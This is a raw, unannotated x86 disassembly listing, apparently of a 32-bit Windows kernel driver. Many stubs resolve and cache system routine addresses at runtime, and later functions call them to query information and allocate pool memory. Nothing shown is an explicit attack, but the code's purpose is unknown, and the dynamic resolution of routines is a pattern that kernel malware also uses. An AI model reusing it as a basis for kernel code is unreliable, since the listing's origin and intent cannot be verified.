   115f3:	int3   
   115f4:	mov    edi,edi
   115f6:	push   ebp
   115f7:	mov    ebp,esp
   115f9:	push   ecx
   115fa:	push   ecx
   115fb:	mov    eax,DWORD PTR [ebp+0x8]
   115fe:	mov    DWORD PTR [ebp-0x4],eax
   11601:	lea    ecx,[eax+0x2]
   11604:	mov    dx,WORD PTR [eax]
   11607:	inc    eax
   11608:	inc    eax
   11609:	test   dx,dx
   1160c:	jne    0x11604
   1160e:	sub    eax,ecx
   11610:	sar    eax,1
   11612:	mov    WORD PTR [ebp-0x8],ax
   11616:	mov    eax,DWORD PTR [ebp-0x8]
   11619:	add    eax,eax
   1161b:	mov    WORD PTR [ebp-0x6],ax
   1161f:	mov    WORD PTR [ebp-0x8],ax
   11623:	lea    eax,[ebp-0x8]
   11626:	push   eax
   11627:	call   DWORD PTR ds:0x1ee64
   1162d:	leave  
   1162e:	ret    0x4
   11631:	int3   
   11632:	int3   
   11633:	int3   
   11634:	int3   
   11635:	int3   
   11636:	mov    edi,edi
   11638:	push   ebp
   11639:	mov    ebp,esp
   1163b:	cmp    DWORD PTR [ebp+0x8],0x0
   1163f:	jge    0x11645
   11641:	and    DWORD PTR [ebp+0x8],0x0
   11645:	push   DWORD PTR [ebp+0x8]
   11648:	call   0x10a66
   1164d:	pop    ecx
   1164e:	pop    ebp
   1164f:	ret    0x8
   11652:	int3   
   11653:	int3   
   11654:	int3   
   11655:	int3   
   11656:	int3   
   11657:	int3   
   11658:	mov    edi,edi
   1165a:	push   ebp
   1165b:	mov    ebp,esp
   1165d:	mov    eax,DWORD PTR [ebp+0x8]
   11660:	test   eax,eax
   11662:	je     0x1166b
   11664:	mov    ecx,DWORD PTR [ebp+0xc]
   11667:	mov    ecx,DWORD PTR [ecx]
   11669:	mov    DWORD PTR [eax],ecx
   1166b:	pop    ebp
   1166c:	ret    0x8
   1166f:	int3   
   11670:	int3   
   11671:	int3   
   11672:	int3   
   11673:	int3   
   11674:	mov    edi,edi
   11676:	push   ebp
   11677:	mov    ebp,esp
   11679:	mov    eax,DWORD PTR [ebp+0x8]
   1167c:	test   eax,eax
   1167e:	je     0x1168d
   11680:	mov    ecx,DWORD PTR [ebp+0xc]
   11683:	mov    edx,DWORD PTR [ecx]
   11685:	mov    DWORD PTR [eax],edx
   11687:	mov    ecx,DWORD PTR [ecx+0x4]
   1168a:	mov    DWORD PTR [eax+0x4],ecx
   1168d:	pop    ebp
   1168e:	ret    0x8
   11691:	int3   
   11692:	int3   
   11693:	int3   
   11694:	int3   
   11695:	int3   
   11696:	mov    edi,edi
   11698:	push   ebp
   11699:	mov    ebp,esp
   1169b:	push   esi
   1169c:	mov    esi,ecx
   1169e:	call   0x110ae
   116a3:	test   BYTE PTR [ebp+0x8],0x1
   116a7:	je     0x116b0
   116a9:	push   esi
   116aa:	call   0x10a9a
   116af:	pop    ecx
   116b0:	mov    eax,esi
   116b2:	pop    esi
   116b3:	pop    ebp
   116b4:	ret    0x4
   116b7:	int3   
   116b8:	int3   
   116b9:	int3   
   116ba:	int3   
   116bb:	int3   
   116bc:	test   BYTE PTR ds:0x7f6ec,0x1
   116c3:	jne    0x116db
   116c5:	or     DWORD PTR ds:0x7f6ec,0x1
   116cc:	push   0x1df24
   116d1:	call   0x115f4
   116d6:	mov    ds:0x7f6e8,eax
   116db:	mov    eax,ds:0x7f6e8
   116e0:	ret    
   116e1:	int3   
   116e2:	int3   
   116e3:	int3   
   116e4:	int3   
   116e5:	int3   
   116e6:	test   BYTE PTR ds:0x7f6f4,0x1
   116ed:	jne    0x11705
   116ef:	or     DWORD PTR ds:0x7f6f4,0x1
   116f6:	push   0x1df40
   116fb:	call   0x115f4
   11700:	mov    ds:0x7f6f0,eax
   11705:	mov    eax,ds:0x7f6f0
   1170a:	ret    
   1170b:	int3   
   1170c:	int3   
   1170d:	int3   
   1170e:	int3   
   1170f:	int3   
   11710:	test   BYTE PTR ds:0x7f6fc,0x1
   11717:	jne    0x1172f
   11719:	or     DWORD PTR ds:0x7f6fc,0x1
   11720:	push   0x1df78
   11725:	call   0x115f4
   1172a:	mov    ds:0x7f6f8,eax
   1172f:	mov    eax,ds:0x7f6f8
   11734:	ret    
   11735:	int3   
   11736:	int3   
   11737:	int3   
   11738:	int3   
   11739:	int3   
   1173a:	test   BYTE PTR ds:0x7f704,0x1
   11741:	jne    0x11759
   11743:	or     DWORD PTR ds:0x7f704,0x1
   1174a:	push   0x1df9a
   1174f:	call   0x115f4
   11754:	mov    ds:0x7f700,eax
   11759:	mov    eax,ds:0x7f700
   1175e:	ret    
   1175f:	int3   
   11760:	int3   
   11761:	int3   
   11762:	int3   
   11763:	int3   
   11764:	test   BYTE PTR ds:0x7f70c,0x1
   1176b:	jne    0x11783
   1176d:	or     DWORD PTR ds:0x7f70c,0x1
   11774:	push   0x1dfda
   11779:	call   0x115f4
   1177e:	mov    ds:0x7f708,eax
   11783:	mov    eax,ds:0x7f708
   11788:	ret    
   11789:	int3   
   1178a:	int3   
   1178b:	int3   
   1178c:	int3   
   1178d:	int3   
   1178e:	test   BYTE PTR ds:0x7f714,0x1
   11795:	jne    0x117ad
   11797:	or     DWORD PTR ds:0x7f714,0x1
   1179e:	push   0x1dff0
   117a3:	call   0x115f4
   117a8:	mov    ds:0x7f710,eax
   117ad:	mov    eax,ds:0x7f710
   117b2:	ret    
   117b3:	int3   
   117b4:	int3   
   117b5:	int3   
   117b6:	int3   
   117b7:	int3   
   117b8:	test   BYTE PTR ds:0x7f71c,0x1
   117bf:	jne    0x117d7
   117c1:	or     DWORD PTR ds:0x7f71c,0x1
   117c8:	push   0x1e024
   117cd:	call   0x115f4
   117d2:	mov    ds:0x7f718,eax
   117d7:	mov    eax,ds:0x7f718
   117dc:	ret    
   117dd:	int3   
   117de:	int3   
   117df:	int3   
   117e0:	int3   
   117e1:	int3   
   117e2:	test   BYTE PTR ds:0x7f724,0x1
   117e9:	jne    0x11801
   117eb:	or     DWORD PTR ds:0x7f724,0x1
   117f2:	push   0x1e056
   117f7:	call   0x115f4
   117fc:	mov    ds:0x7f720,eax
   11801:	mov    eax,ds:0x7f720
   11806:	ret    
   11807:	int3   
   11808:	int3   
   11809:	int3   
   1180a:	int3   
   1180b:	int3   
   1180c:	test   BYTE PTR ds:0x7f72c,0x1
   11813:	jne    0x1182b
   11815:	or     DWORD PTR ds:0x7f72c,0x1
   1181c:	push   0x1e06a
   11821:	call   0x115f4
   11826:	mov    ds:0x7f728,eax
   1182b:	mov    eax,ds:0x7f728
   11830:	ret    
   11831:	int3   
   11832:	int3   
   11833:	int3   
   11834:	int3   
   11835:	int3   
   11836:	test   BYTE PTR ds:0x7f734,0x1
   1183d:	jne    0x11855
   1183f:	or     DWORD PTR ds:0x7f734,0x1
   11846:	push   0x1e082
   1184b:	call   0x115f4
   11850:	mov    ds:0x7f730,eax
   11855:	mov    eax,ds:0x7f730
   1185a:	ret    
   1185b:	int3   
   1185c:	int3   
   1185d:	int3   
   1185e:	int3   
   1185f:	int3   
   11860:	test   BYTE PTR ds:0x7f73c,0x1
   11867:	jne    0x1187f
   11869:	or     DWORD PTR ds:0x7f73c,0x1
   11870:	push   0x1e09e
   11875:	call   0x115f4
   1187a:	mov    ds:0x7f738,eax
   1187f:	mov    eax,ds:0x7f738
   11884:	ret    
   11885:	int3   
   11886:	int3   
   11887:	int3   
   11888:	int3   
   11889:	int3   
   1188a:	test   BYTE PTR ds:0x7f744,0x1
   11891:	jne    0x118a9
   11893:	or     DWORD PTR ds:0x7f744,0x1
   1189a:	push   0x1e0d8
   1189f:	call   0x115f4
   118a4:	mov    ds:0x7f740,eax
   118a9:	mov    eax,ds:0x7f740
   118ae:	ret    
   118af:	int3   
   118b0:	int3   
   118b1:	int3   
   118b2:	int3   
   118b3:	int3   
   118b4:	test   BYTE PTR ds:0x7f74c,0x1
   118bb:	jne    0x118d3
   118bd:	or     DWORD PTR ds:0x7f74c,0x1
   118c4:	push   0x1e0f2
   118c9:	call   0x115f4
   118ce:	mov    ds:0x7f748,eax
   118d3:	mov    eax,ds:0x7f748
   118d8:	ret    
   118d9:	int3   
   118da:	int3   
   118db:	int3   
   118dc:	int3   
   118dd:	int3   
   118de:	test   BYTE PTR ds:0x7f754,0x1
   118e5:	jne    0x118fd
   118e7:	or     DWORD PTR ds:0x7f754,0x1
   118ee:	push   0x1e114
   118f3:	call   0x115f4
   118f8:	mov    ds:0x7f750,eax
   118fd:	mov    eax,ds:0x7f750
   11902:	ret    
   11903:	int3   
   11904:	int3   
   11905:	int3   
   11906:	int3   
   11907:	int3   
   11908:	test   BYTE PTR ds:0x7f75c,0x1
   1190f:	jne    0x11927
   11911:	or     DWORD PTR ds:0x7f75c,0x1
   11918:	push   0x1e14e
   1191d:	call   0x115f4
   11922:	mov    ds:0x7f758,eax
   11927:	mov    eax,ds:0x7f758
   1192c:	ret    
   1192d:	int3   
   1192e:	int3   
   1192f:	int3   
   11930:	int3   
   11931:	int3   
   11932:	test   BYTE PTR ds:0x7f764,0x1
   11939:	jne    0x11951
   1193b:	or     DWORD PTR ds:0x7f764,0x1
   11942:	push   0x1e174
   11947:	call   0x115f4
   1194c:	mov    ds:0x7f760,eax
   11951:	mov    eax,ds:0x7f760
   11956:	ret    
   11957:	int3   
   11958:	int3   
   11959:	int3   
   1195a:	int3   
   1195b:	int3   
   1195c:	test   BYTE PTR ds:0x7f76c,0x1
   11963:	jne    0x1197b
   11965:	or     DWORD PTR ds:0x7f76c,0x1
   1196c:	push   0x1e1a4
   11971:	call   0x115f4
   11976:	mov    ds:0x7f768,eax
   1197b:	mov    eax,ds:0x7f768
   11980:	ret    
   11981:	int3   
   11982:	int3   
   11983:	int3   
   11984:	int3   
   11985:	int3   
   11986:	test   BYTE PTR ds:0x7f774,0x1
   1198d:	jne    0x119a5
   1198f:	or     DWORD PTR ds:0x7f774,0x1
   11996:	push   0x1e1d6
   1199b:	call   0x115f4
   119a0:	mov    ds:0x7f770,eax
   119a5:	mov    eax,ds:0x7f770
   119aa:	ret    
   119ab:	int3   
   119ac:	int3   
   119ad:	int3   
   119ae:	int3   
   119af:	int3   
   119b0:	test   BYTE PTR ds:0x7f77c,0x1
   119b7:	jne    0x119cf
   119b9:	or     DWORD PTR ds:0x7f77c,0x1
   119c0:	push   0x1e1ea
   119c5:	call   0x115f4
   119ca:	mov    ds:0x7f778,eax
   119cf:	mov    eax,ds:0x7f778
   119d4:	ret    
   119d5:	int3   
   119d6:	int3   
   119d7:	int3   
   119d8:	int3   
   119d9:	int3   
   119da:	test   BYTE PTR ds:0x7f784,0x1
   119e1:	jne    0x119f9
   119e3:	or     DWORD PTR ds:0x7f784,0x1
   119ea:	push   0x1e208
   119ef:	call   0x115f4
   119f4:	mov    ds:0x7f780,eax
   119f9:	mov    eax,ds:0x7f780
   119fe:	ret    
   119ff:	int3   
   11a00:	int3   
   11a01:	int3   
   11a02:	int3   
   11a03:	int3   
   11a04:	test   BYTE PTR ds:0x7f78c,0x1
   11a0b:	jne    0x11a23
   11a0d:	or     DWORD PTR ds:0x7f78c,0x1
   11a14:	push   0x1e222
   11a19:	call   0x115f4
   11a1e:	mov    ds:0x7f788,eax
   11a23:	mov    eax,ds:0x7f788
   11a28:	ret    
   11a29:	int3   
   11a2a:	int3   
   11a2b:	int3   
   11a2c:	int3   
   11a2d:	int3   
   11a2e:	test   BYTE PTR ds:0x7f794,0x1
   11a35:	jne    0x11a4d
   11a37:	or     DWORD PTR ds:0x7f794,0x1
   11a3e:	push   0x1e23a
   11a43:	call   0x115f4
   11a48:	mov    ds:0x7f790,eax
   11a4d:	mov    eax,ds:0x7f790
   11a52:	ret    
   11a53:	int3   
   11a54:	int3   
   11a55:	int3   
   11a56:	int3   
   11a57:	int3   
   11a58:	test   BYTE PTR ds:0x7f79c,0x1
   11a5f:	jne    0x11a77
   11a61:	or     DWORD PTR ds:0x7f79c,0x1
   11a68:	push   0x1e258
   11a6d:	call   0x115f4
   11a72:	mov    ds:0x7f798,eax
   11a77:	mov    eax,ds:0x7f798
   11a7c:	ret    
   11a7d:	int3   
   11a7e:	int3   
   11a7f:	int3   
   11a80:	int3   
   11a81:	int3   
   11a82:	test   BYTE PTR ds:0x7f7a4,0x1
   11a89:	jne    0x11aa1
   11a8b:	or     DWORD PTR ds:0x7f7a4,0x1
   11a92:	push   0x1e278
   11a97:	call   0x115f4
   11a9c:	mov    ds:0x7f7a0,eax
   11aa1:	mov    eax,ds:0x7f7a0
   11aa6:	ret    
   11aa7:	int3   
   11aa8:	int3   
   11aa9:	int3   
   11aaa:	int3   
   11aab:	int3   
   11aac:	test   BYTE PTR ds:0x7f7ac,0x1
   11ab3:	jne    0x11acb
   11ab5:	or     DWORD PTR ds:0x7f7ac,0x1
   11abc:	push   0x1e298
   11ac1:	call   0x115f4
   11ac6:	mov    ds:0x7f7a8,eax
   11acb:	mov    eax,ds:0x7f7a8
   11ad0:	ret    
   11ad1:	int3   
   11ad2:	int3   
   11ad3:	int3   
   11ad4:	int3   
   11ad5:	int3   
   11ad6:	test   BYTE PTR ds:0x7f7b4,0x1
   11add:	jne    0x11af5
   11adf:	or     DWORD PTR ds:0x7f7b4,0x1
   11ae6:	push   0x1e2b8
   11aeb:	call   0x115f4
   11af0:	mov    ds:0x7f7b0,eax
   11af5:	mov    eax,ds:0x7f7b0
   11afa:	ret    
   11afb:	int3   
   11afc:	int3   
   11afd:	int3   
   11afe:	int3   
   11aff:	int3   
   11b00:	test   BYTE PTR ds:0x7f7bc,0x1
   11b07:	jne    0x11b1f
   11b09:	or     DWORD PTR ds:0x7f7bc,0x1
   11b10:	push   0x1e2ce
   11b15:	call   0x115f4
   11b1a:	mov    ds:0x7f7b8,eax
   11b1f:	mov    eax,ds:0x7f7b8
   11b24:	ret    
   11b25:	int3   
   11b26:	int3   
   11b27:	int3   
   11b28:	int3   
   11b29:	int3   
   11b2a:	test   BYTE PTR ds:0x7f7c4,0x1
   11b31:	jne    0x11b49
   11b33:	or     DWORD PTR ds:0x7f7c4,0x1
   11b3a:	push   0x1e2f8
   11b3f:	call   0x115f4
   11b44:	mov    ds:0x7f7c0,eax
   11b49:	mov    eax,ds:0x7f7c0
   11b4e:	ret    
   11b4f:	int3   
   11b50:	int3   
   11b51:	int3   
   11b52:	int3   
   11b53:	int3   
   11b54:	test   BYTE PTR ds:0x7f7cc,0x1
   11b5b:	jne    0x11b73
   11b5d:	or     DWORD PTR ds:0x7f7cc,0x1
   11b64:	push   0x1e310
   11b69:	call   0x115f4
   11b6e:	mov    ds:0x7f7c8,eax
   11b73:	mov    eax,ds:0x7f7c8
   11b78:	ret    
   11b79:	int3   
   11b7a:	int3   
   11b7b:	int3   
   11b7c:	int3   
   11b7d:	int3   
   11b7e:	test   BYTE PTR ds:0x7f7d4,0x1
   11b85:	jne    0x11b9d
   11b87:	or     DWORD PTR ds:0x7f7d4,0x1
   11b8e:	push   0x1e33e
   11b93:	call   0x115f4
   11b98:	mov    ds:0x7f7d0,eax
   11b9d:	mov    eax,ds:0x7f7d0
   11ba2:	ret    
   11ba3:	int3   
   11ba4:	int3   
   11ba5:	int3   
   11ba6:	int3   
   11ba7:	int3   
   11ba8:	test   BYTE PTR ds:0x7f7dc,0x1
   11baf:	jne    0x11bc7
   11bb1:	or     DWORD PTR ds:0x7f7dc,0x1
   11bb8:	push   0x1e368
   11bbd:	call   0x115f4
   11bc2:	mov    ds:0x7f7d8,eax
   11bc7:	mov    eax,ds:0x7f7d8
   11bcc:	ret    
   11bcd:	int3   
   11bce:	int3   
   11bcf:	int3   
   11bd0:	int3   
   11bd1:	int3   
   11bd2:	test   BYTE PTR ds:0x7f7e4,0x1
   11bd9:	jne    0x11bf1
   11bdb:	or     DWORD PTR ds:0x7f7e4,0x1
   11be2:	push   0x1e386
   11be7:	call   0x115f4
   11bec:	mov    ds:0x7f7e0,eax
   11bf1:	mov    eax,ds:0x7f7e0
   11bf6:	ret    
   11bf7:	int3   
   11bf8:	int3   
   11bf9:	int3   
   11bfa:	int3   
   11bfb:	int3   
   11bfc:	test   BYTE PTR ds:0x7f7ec,0x1
   11c03:	jne    0x11c1b
   11c05:	or     DWORD PTR ds:0x7f7ec,0x1
   11c0c:	push   0x1e3b4
   11c11:	call   0x115f4
   11c16:	mov    ds:0x7f7e8,eax
   11c1b:	mov    eax,ds:0x7f7e8
   11c20:	ret    
   11c21:	int3   
   11c22:	int3   
   11c23:	int3   
   11c24:	int3   
   11c25:	int3   
   11c26:	test   BYTE PTR ds:0x7f7f4,0x1
   11c2d:	jne    0x11c45
   11c2f:	or     DWORD PTR ds:0x7f7f4,0x1
   11c36:	push   0x1e3da
   11c3b:	call   0x115f4
   11c40:	mov    ds:0x7f7f0,eax
   11c45:	mov    eax,ds:0x7f7f0
   11c4a:	ret    
   11c4b:	int3   
   11c4c:	int3   
   11c4d:	int3   
   11c4e:	int3   
   11c4f:	int3   
   11c50:	test   BYTE PTR ds:0x7f7fc,0x1
   11c57:	jne    0x11c6f
   11c59:	or     DWORD PTR ds:0x7f7fc,0x1
   11c60:	push   0x1e404
   11c65:	call   0x115f4
   11c6a:	mov    ds:0x7f7f8,eax
   11c6f:	mov    eax,ds:0x7f7f8
   11c74:	ret    
   11c75:	int3   
   11c76:	int3   
   11c77:	int3   
   11c78:	int3   
   11c79:	int3   
   11c7a:	test   BYTE PTR ds:0x7f804,0x1
   11c81:	jne    0x11c99
   11c83:	or     DWORD PTR ds:0x7f804,0x1
   11c8a:	push   0x1e428
   11c8f:	call   0x115f4
   11c94:	mov    ds:0x7f800,eax
   11c99:	mov    eax,ds:0x7f800
   11c9e:	ret    
   11c9f:	int3   
   11ca0:	int3   
   11ca1:	int3   
   11ca2:	int3   
   11ca3:	int3   
   11ca4:	test   BYTE PTR ds:0x7f80c,0x1
   11cab:	jne    0x11cc3
   11cad:	or     DWORD PTR ds:0x7f80c,0x1
   11cb4:	push   0x1e452
   11cb9:	call   0x115f4
   11cbe:	mov    ds:0x7f808,eax
   11cc3:	mov    eax,ds:0x7f808
   11cc8:	ret    
   11cc9:	int3   
   11cca:	int3   
   11ccb:	int3   
   11ccc:	int3   
   11ccd:	int3   
   11cce:	test   BYTE PTR ds:0x7f814,0x1
   11cd5:	jne    0x11ced
   11cd7:	or     DWORD PTR ds:0x7f814,0x1
   11cde:	push   0x1e47c
   11ce3:	call   0x115f4
   11ce8:	mov    ds:0x7f810,eax
   11ced:	mov    eax,ds:0x7f810
   11cf2:	ret    
   11cf3:	int3   
   11cf4:	int3   
   11cf5:	int3   
   11cf6:	int3   
   11cf7:	int3   
   11cf8:	test   BYTE PTR ds:0x7f81c,0x1
   11cff:	jne    0x11d17
   11d01:	or     DWORD PTR ds:0x7f81c,0x1
   11d08:	push   0x1e4b2
   11d0d:	call   0x115f4
   11d12:	mov    ds:0x7f818,eax
   11d17:	mov    eax,ds:0x7f818
   11d1c:	ret    
   11d1d:	int3   
   11d1e:	int3   
   11d1f:	int3   
   11d20:	int3   
   11d21:	int3   
   11d22:	call   0x116bc
   11d27:	test   eax,eax
   11d29:	jne    0x11d2e
   11d2b:	xor    eax,eax
   11d2d:	ret    
   11d2e:	call   0x116e6
   11d33:	test   eax,eax
   11d35:	je     0x11d2b
   11d37:	call   0x11710
   11d3c:	test   eax,eax
   11d3e:	je     0x11d2b
   11d40:	call   0x1173a
   11d45:	test   eax,eax
   11d47:	je     0x11d2b
   11d49:	call   0x11764
   11d4e:	test   eax,eax
   11d50:	je     0x11d2b
   11d52:	call   0x1178e
   11d57:	test   eax,eax
   11d59:	je     0x11d2b
   11d5b:	call   0x117b8
   11d60:	test   eax,eax
   11d62:	je     0x11d2b
   11d64:	call   0x117e2
   11d69:	test   eax,eax
   11d6b:	je     0x11d2b
   11d6d:	call   0x1180c
   11d72:	test   eax,eax
   11d74:	je     0x11d2b
   11d76:	call   0x11836
   11d7b:	test   eax,eax
   11d7d:	je     0x11d2b
   11d7f:	call   0x11860
   11d84:	test   eax,eax
   11d86:	je     0x11d2b
   11d88:	call   0x1188a
   11d8d:	test   eax,eax
   11d8f:	je     0x11d2b
   11d91:	call   0x118b4
   11d96:	test   eax,eax
   11d98:	je     0x11d2b
   11d9a:	call   0x118de
   11d9f:	test   eax,eax
   11da1:	je     0x11d2b
   11da3:	call   0x11908
   11da8:	test   eax,eax
   11daa:	je     0x11d2b
   11db0:	call   0x11932
   11db5:	test   eax,eax
   11db7:	je     0x11d2b
   11dbd:	call   0x1195c
   11dc2:	test   eax,eax
   11dc4:	je     0x11d2b
   11dca:	call   0x11986
   11dcf:	test   eax,eax
   11dd1:	je     0x11d2b
   11dd7:	call   0x119b0
   11ddc:	test   eax,eax
   11dde:	je     0x11d2b
   11de4:	call   0x119da
   11de9:	test   eax,eax
   11deb:	je     0x11d2b
   11df1:	call   0x11a04
   11df6:	test   eax,eax
   11df8:	je     0x11d2b
   11dfe:	call   0x11a2e
   11e03:	test   eax,eax
   11e05:	je     0x11d2b
   11e0b:	call   0x11a58
   11e10:	test   eax,eax
   11e12:	je     0x11d2b
   11e18:	call   0x11a82
   11e1d:	test   eax,eax
   11e1f:	je     0x11d2b
   11e25:	call   0x11aac
   11e2a:	test   eax,eax
   11e2c:	je     0x11d2b
   11e32:	call   0x11ad6
   11e37:	test   eax,eax
   11e39:	je     0x11d2b
   11e3f:	call   0x11b00
   11e44:	test   eax,eax
   11e46:	je     0x11d2b
   11e4c:	call   0x11b2a
   11e51:	test   eax,eax
   11e53:	je     0x11d2b
   11e59:	call   0x11b54
   11e5e:	test   eax,eax
   11e60:	je     0x11d2b
   11e66:	call   0x11b7e
   11e6b:	test   eax,eax
   11e6d:	je     0x11d2b
   11e73:	call   0x11ba8
   11e78:	test   eax,eax
   11e7a:	je     0x11d2b
   11e80:	call   0x11bd2
   11e85:	test   eax,eax
   11e87:	je     0x11d2b
   11e8d:	call   0x11bfc
   11e92:	test   eax,eax
   11e94:	je     0x11d2b
   11e9a:	call   0x11c26
   11e9f:	test   eax,eax
   11ea1:	je     0x11d2b
   11ea7:	call   0x11c50
   11eac:	test   eax,eax
   11eae:	je     0x11d2b
   11eb4:	call   0x11c7a
   11eb9:	test   eax,eax
   11ebb:	je     0x11d2b
   11ec1:	call   0x11ca4
   11ec6:	test   eax,eax
   11ec8:	je     0x11d2b
   11ece:	call   0x11cce
   11ed3:	test   eax,eax
   11ed5:	je     0x11d2b
   11edb:	call   0x11cf8
   11ee0:	neg    eax
   11ee2:	sbb    eax,eax
   11ee4:	neg    eax
   11ee6:	ret    
   11ee7:	int3   
   11ee8:	int3   
   11ee9:	int3   
   11eea:	int3   
   11eeb:	int3   
   11eec:	mov    edi,edi
   11eee:	push   esi
   11eef:	mov    esi,ecx
   11ef1:	push   DWORD PTR [esi+0x48]
   11ef4:	call   0x10a9a
   11ef9:	push   DWORD PTR [esi+0x24]
   11efc:	call   0x10a9a
   11f01:	push   DWORD PTR [esi+0x1c]
   11f04:	call   0x10a9a
   11f09:	push   DWORD PTR [esi+0x14]
   11f0c:	call   0x10a9a
   11f11:	push   DWORD PTR [esi+0x8]
   11f14:	call   0x10a9a
   11f19:	push   DWORD PTR [esi]
   11f1b:	call   0x10a9a
   11f20:	add    esp,0x18
   11f23:	pop    esi
   11f24:	ret    
   11f25:	int3   
   11f26:	int3   
   11f27:	int3   
   11f28:	int3   
   11f29:	int3   
   11f2a:	mov    edi,edi
   11f2c:	push   ebp
   11f2d:	mov    ebp,esp
   11f2f:	mov    eax,ecx
   11f31:	mov    ecx,DWORD PTR [ebp+0x8]
   11f34:	mov    edx,DWORD PTR [ecx]
   11f36:	test   edx,edx
   11f38:	je     0x11f41
   11f3a:	mov    DWORD PTR [eax],edx
   11f3c:	inc    DWORD PTR [edx+0x4]
   11f3f:	jmp    0x11f44
   11f41:	and    DWORD PTR [eax],0x0
   11f44:	pop    ebp
   11f45:	ret    0x4
   11f48:	int3   
   11f49:	int3   
   11f4a:	int3   
   11f4b:	int3   
   11f4c:	int3   
   11f4d:	int3   
   11f4e:	mov    edi,edi
   11f50:	push   ebp
   11f51:	mov    ebp,esp
   11f53:	push   esi
   11f54:	mov    esi,ecx
   11f56:	mov    ecx,DWORD PTR [esi]
   11f58:	test   ecx,ecx
   11f5a:	je     0x11f61
   11f5c:	call   0x10ab8
   11f61:	mov    eax,DWORD PTR [ebp+0x8]
   11f64:	mov    eax,DWORD PTR [eax]
   11f66:	mov    DWORD PTR [esi],eax
   11f68:	inc    DWORD PTR [eax+0x4]
   11f6b:	mov    eax,esi
   11f6d:	pop    esi
   11f6e:	pop    ebp
   11f6f:	ret    0x4
   11f72:	int3   
   11f73:	int3   
   11f74:	int3   
   11f75:	int3   
   11f76:	int3   
   11f77:	int3   
   11f78:	mov    edi,edi
   11f7a:	push   ebp
   11f7b:	mov    ebp,esp
   11f7d:	push   ebx
   11f7e:	push   esi
   11f7f:	push   edi
   11f80:	mov    edi,DWORD PTR [ebp+0xc]
   11f83:	mov    esi,ecx
   11f85:	and    DWORD PTR [esi+0x4],0x0
   11f89:	lea    eax,[edi+0x1]
   11f8c:	push   eax
   11f8d:	mov    DWORD PTR [esi+0x8],edi
   11f90:	call   0x10a66
   11f95:	push   edi
   11f96:	push   DWORD PTR [ebp+0x8]
   11f99:	mov    ebx,eax
   11f9b:	push   ebx
   11f9c:	call   0x1daa0
   11fa1:	add    esp,0x10
   11fa4:	inc    DWORD PTR [esi+0x4]
   11fa7:	pop    edi
   11fa8:	mov    DWORD PTR [esi],ebx
   11faa:	mov    eax,esi
   11fac:	pop    esi
   11fad:	pop    ebx
   11fae:	pop    ebp
   11faf:	ret    0x8
   11fb2:	int3   
   11fb3:	int3   
   11fb4:	int3   
   11fb5:	int3   
   11fb6:	int3   
   11fb7:	int3   
   11fb8:	mov    edi,edi
   11fba:	push   ebp
   11fbb:	mov    ebp,esp
   11fbd:	push   ecx
   11fbe:	push   edi
   11fbf:	lea    eax,[ebp-0x4]
   11fc2:	push   eax
   11fc3:	xor    edi,edi
   11fc5:	push   edi
   11fc6:	push   edi
   11fc7:	push   0x1b
   11fc9:	push   DWORD PTR [ebp+0x8]
   11fcc:	call   0x1178e
   11fd1:	call   eax
   11fd3:	cmp    eax,0xc0000004
   11fd8:	jne    0x12040
   11fda:	mov    ecx,DWORD PTR [ebp-0x4]
   11fdd:	push   ebx
   11fde:	mov    ebx,DWORD PTR [ebp+0xc]
   11fe1:	movzx  edx,WORD PTR [ebx+0x2]
   11fe5:	lea    eax,[ecx-0x8]
   11fe8:	cmp    edx,eax
   11fea:	jae    0x11ff6
   11fec:	mov    WORD PTR [ebx],ax
   11fef:	mov    eax,0x80000005
   11ff4:	jmp    0x1203f
   11ff6:	push   esi
   11ff7:	push   0x20736649
   11ffc:	push   ecx
   11ffd:	push   edi
   11ffe:	call   DWORD PTR ds:0x1ee2c
   12004:	mov    esi,eax
   12006:	cmp    esi,edi
   12008:	jne    0x12011
   1200a:	mov    eax,0xc000009a
   1200f:	jmp    0x1203e
   12011:	lea    eax,[ebp-0x4]
   12014:	push   eax
   12015:	push   DWORD PTR [ebp-0x4]
   12018:	push   esi
   12019:	push   0x1b
   1201b:	push   DWORD PTR [ebp+0x8]
   1201e:	call   0x1178e
   12023:	call   eax
   12025:	mov    edi,eax
   12027:	test   edi,edi
   12029:	jl     0x12033
   1202b:	push   esi
   1202c:	push   ebx
   1202d:	call   DWORD PTR ds:0x1ee34
   12033:	push   0x0
   12035:	push   esi
   12036:	call   DWORD PTR ds:0x1ee1c
   1203c:	mov    eax,edi
   1203e:	pop    esi
   1203f:	pop    ebx
   12040:	pop    edi
   12041:	leave  
   12042:	ret    0x8
   12045:	int3   
   12046:	int3   
   12047:	int3   
   12048:	int3   
   12049:	int3   
   1204a:	mov    edi,edi
   1204c:	push   ebp
   1204d:	mov    ebp,esp
   1204f:	sub    esp,0x18
   12052:	push   0x0
   12054:	push   0x18
   12056:	lea    eax,[ebp-0x18]
   12059:	push   eax
   1205a:	push   0x0
   1205c:	push   DWORD PTR [ebp+0x8]
   1205f:	call   0x1178e
   12064:	call   eax
   12066:	test   eax,eax
   12068:	jl     0x1206f
   1206a:	mov    eax,DWORD PTR [ebp-0x8]
   1206d:	jmp    0x12071
   1206f:	xor    eax,eax
   12071:	leave  
   12072:	ret    0x4
   12075:	int3   
   12076:	int3   
   12077:	int3   
   12078:	int3   
   12079:	int3   
   1207a:	mov    edi,edi
   1207c:	push   ebp
   1207d:	mov    ebp,esp
   1207f:	mov    ecx,DWORD PTR ds:0x7edbc
   12085:	sub    esp,0x38
   12088:	push   esi
   12089:	xor    esi,esi
   1208b:	cmp    ecx,esi
   1208d:	jne    0x12097
   1208f:	or     eax,0xffffffff
   12092:	jmp    0x12172
   12097:	push   edi
   12098:	xor    eax,eax
   1209a:	mov    DWORD PTR [ebp-0x20],esi
   1209d:	lea    edi,[ebp-0x1c]
   120a0:	stos   DWORD PTR es:[edi],eax
   120a1:	lea    eax,[ebp-0x18]
   120a4:	push   eax
   120a5:	lea    eax,[ebp-0x38]
   120a8:	push   eax
   120a9:	push   0x400
   120ae:	lea    eax,[ebp-0x10]
   120b1:	push   eax
   120b2:	mov    DWORD PTR [ebp-0x4],esi
   120b5:	mov    DWORD PTR [ebp-0x38],0x18
   120bc:	mov    DWORD PTR [ebp-0x34],esi
   120bf:	mov    DWORD PTR [ebp-0x2c],esi
   120c2:	mov    DWORD PTR [ebp-0x30],esi
   120c5:	mov    DWORD PTR [ebp-0x28],esi
   120c8:	mov    DWORD PTR [ebp-0x24],esi
   120cb:	mov    DWORD PTR [ebp-0x18],ecx
   120ce:	mov    DWORD PTR [ebp-0x14],esi
   120d1:	call   0x116bc
   120d6:	call   eax
   120d8:	mov    edi,eax
